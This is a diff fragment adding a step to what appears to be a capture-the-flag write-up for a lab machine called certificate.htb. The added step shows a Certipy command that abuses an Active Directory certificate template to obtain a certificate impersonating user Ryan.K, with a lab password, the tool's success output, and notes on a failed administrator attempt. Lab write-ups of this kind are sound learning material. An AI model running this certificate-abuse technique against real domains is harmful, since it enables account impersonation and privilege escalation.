@@ -674,8 +674,21 @@ Ill now need to use this cert on another template
 This is the only template that fits the scenario
 
 ```python
+❯❯❯ certipy-ad req -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-host dc01.certificate.htb -dc-ip 10.129.245.51 -target-ip 10.129.245.51 -target dc01.certificate.htb -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\Ryan.K'
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[*] Requesting certificate via RPC
+[*] Request ID is 32
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Ryan.K@certificate.htb'
+[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
+[*] Saving certificate and private key to 'ryan.k.pfx'
+[*] Wrote certificate and private key to 'ryan.k.pfx'
 ```
+
+I originally tried the administrator but this failed and after researching the error i see that its becuase it requires an email set in ldap on the administrator account, which isnt set
+
+
 
 
 
